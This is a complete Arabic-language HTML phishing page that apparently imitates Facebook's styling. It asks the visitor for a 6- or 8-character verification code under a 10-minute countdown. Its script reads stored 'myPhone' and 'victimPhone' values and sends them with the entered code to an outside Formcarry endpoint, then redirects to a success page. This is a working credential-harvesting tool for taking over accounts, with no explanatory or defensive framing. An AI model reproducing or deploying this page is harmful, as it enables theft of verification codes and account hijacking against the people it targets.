<!DOCTYPE html>
<html lang="ar">
<head>
  <meta charset="UTF-8">
  <title>تأكيد الكود</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@500;700&display=swap" rel="stylesheet">
  <style>
    body {
      font-family: 'Cairo', sans-serif;
      background: linear-gradient(135deg, #4267B2, #29487d);
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
      direction: rtl;
    }

    .container {
      background: white;
      border-radius: 16px;
      padding: 30px;
      box-shadow: 0 10px 25px rgba(0, 0, 0, 0.15);
      width: 90%;
      max-width: 420px;
      text-align: center;
    }

    h2 {
      color: #4267B2;
      margin-bottom: 15px;
      font-weight: 800;
    }

    #timer {
      font-size: 18px;
      color: #e91e63;
      margin-bottom: 15px;
      font-weight: bold;
    }

    input {
      width: 100%;
      padding: 12px;
      margin-bottom: 15px;
      border-radius: 10px;
      border: 1.5px solid #ccc;
      font-size: 16px;
      box-sizing: border-box;
      text-align: center;
      direction: ltr;
    }

    button {
      width: 100%;
      padding: 12px;
      background-color: #1877f2;
      color: white;
      font-size: 17px;
      border: none;
      border-radius: 10px;
      cursor: pointer;
      font-weight: bold;
    }

    button:hover {
      background-color: #145dbf;
    }

    .error {
      color: red;
      font-size: 14px;
      margin-bottom: 10px;
    }
  </style>
</head>
<body>
  <div class="container">
    <h2>أدخل الكود المرسل</h2>
    <div id="timer">10:00</div>
    <input type="text" id="codeInput" placeholder="ادخل الكود هنا">
    <div id="errorMessage" class="error"></div>
    <button onclick="submitCode()">طلب الدخول</button>
  </div>

  <script>
    // المؤقت 10 دقائق
    let timeLeft = 600;
    const timer = document.getElementById('timer');
    const interval = setInterval(() => {
      const min = Math.floor(timeLeft / 60).toString().padStart(2, '0');
      const sec = (timeLeft % 60).toString().padStart(2, '0');
      timer.textContent = `${min}:${sec}`;
      if (timeLeft <= 0) clearInterval(interval);
      timeLeft--;
    }, 1000);

    // التحقق من الكود والإرسال
    function submitCode() {
      const code = document.getElementById('codeInput').value.trim();
      const error = document.getElementById('errorMessage');
      const myPhone = localStorage.getItem("myPhone");
      const victimPhone = localStorage.getItem("victimPhone");

      const isValidCode = /^\d{6}$/.test(code) || /^[A-Za-z0-9]{8}$/.test(code);

      if (!isValidCode) {
        error.textContent = "⚠️ يجب أن يكون الكود 6 أرقام أو 8 أرقام/حروف.";
        return;
      }

      error.textContent = "";

      // إرسال إلى Formcarry
      fetch("https://formcarry.com/s/okSxTy0Kf3m", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          "Accept": "application/json"
        },
        body: JSON.stringify({
          code: code,
          myPhone: myPhone,
          victimPhone: victimPhone
        })
      })
      .then(response => {
        if (!response.ok) throw new Error("فشل الإرسال");
        window.location.href = "success.html";
      })
      .catch(err => {
        error.textContent = "حدث خطأ أثناء الإرسال.";
        console.error(err);
      });
    }
  </script>
</body>
</html>
